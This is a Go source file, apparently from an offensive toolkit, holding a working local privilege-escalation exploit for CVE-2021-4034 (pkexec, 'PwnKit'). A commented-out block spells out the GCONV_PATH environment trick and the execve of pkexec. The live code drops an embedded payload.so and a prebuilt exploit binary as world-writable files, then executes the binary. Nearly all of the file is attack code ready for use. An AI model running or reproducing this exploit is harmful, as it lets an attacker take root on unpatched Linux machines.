package golpe

import (
	"fmt"
	"io/ioutil"
	"os/exec"
)

func CVE_2021_4034() (err error) {
	// var (
	// 	argv = []string{"\x00"}
	// 	envv = []string{
	// 		"lol",
	// 		"PATH=GCONV_PATH=.",
	// 		"LC_MESSAGES=en_US.UTF-8",
	// 		"XAUTHORITY=../LOL",
	// 		"\x00",
	// 	}
	// 	gconv_path_eq        = "GCONV_PATH=."
	// 	gconv_module_content = "module  UTF-8//    INTERNAL    ../payload    2\n"
	// )
	//
	// // prepare payload.so
	// data, err := ExtractFileFromString(so_data)
	// if err != nil {
	// 	return
	// }
	//
	// // write payload.so
	// if len(data) == 0 {
	// 	return fmt.Errorf("Failed to decompress payload.so")
	// }
	// err = ioutil.WriteFile("payload.so", data, 0777)
	// if err != nil {
	// 	return fmt.Errorf("write payload.so: %v", err)
	// }
	//
	// // fuck with env
	// if _, err = os.Stat(gconv_path_eq); err != nil {
	// 	if err = os.Mkdir(gconv_path_eq, 0755); err != nil {
	// 		return fmt.Errorf("mkdir %s: %v", gconv_path_eq, err)
	// 	}
	// 	_, err = os.Create(gconv_path_eq + "/lol")
	// 	if err != nil {
	// 		return
	// 	}
	// }
	//
	// // gconv-modules
	// if _, err = os.Stat("lol"); err != nil {
	// 	if err = os.Mkdir("lol", 0755); err != nil {
	// 		return fmt.Errorf("mkdir lol: %v", err)
	// 	}
	//
	// 	/*
	// 	   Returning to the example above where one has written a module to directly convert from ISO-2022-JP to EUC-JP and back. All that has to be done is to put the new module, let its name be `ISO2022JP-EUCJP.so`, in a directory and add a file gconv-modules with the following content in the same directory:
	//
	// 	   module  ISO-2022-JP//   EUC-JP//        ISO2022JP-EUCJP    1
	// 	   module  EUC-JP//        ISO-2022-JP//   ISO2022JP-EUCJP    1
	// 	*/
	// 	err = ioutil.WriteFile("lol/gconv-modules", []byte(gconv_module_content), 0777)
	// 	if err != nil {
	// 		return fmt.Errorf("Write gconv-modules: %v", err)
	// 	}
	// }
	//
	// // run pkexec
	// pkexec_path, err := exec.LookPath("pkexec")
	// if err != nil {
	// 	return
	// }
	//
	// argv0 := pkexec_path
	// argv0p, err := syscall.BytePtrFromString(argv0)
	// if err != nil {
	// 	return err
	// }
	// argvp, err := syscall.SlicePtrFromStrings(argv)
	// if err != nil {
	// 	return err
	// }
	// envvp, err := syscall.SlicePtrFromStrings(envv)
	// if err != nil {
	// 	return err
	// }
	// _, _, err = syscall.RawSyscall(syscall.SYS_EXECVE,
	// 	uintptr(unsafe.Pointer(argv0p)),
	// 	uintptr(unsafe.Pointer(&argvp)),
	// 	uintptr(unsafe.Pointer(&envvp[0])))

	// prepare payload.so
	data, err := ExtractFileFromString(so_data)
	if err != nil {
		return
	}
	// write payload.so
	if len(data) == 0 {
		return fmt.Errorf("Failed to decompress payload.so")
	}
	err = ioutil.WriteFile("payload.so", data, 0777)
	if err != nil {
		return fmt.Errorf("write payload.so: %v", err)
	}

	// just run blasty's exploit
	data, err = ExtractFileFromString(exp_data)
	if err != nil {
		return fmt.Errorf("Extract exp_data")
	}
	err = ioutil.WriteFile("pkexec-lpe", data, 0777)
	if err != nil {
		return fmt.Errorf("write pkexec-lpe: %v", err)
	}
	cmd := exec.Command("./pkexec-lpe")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %v", out, err)
	}

	return
}
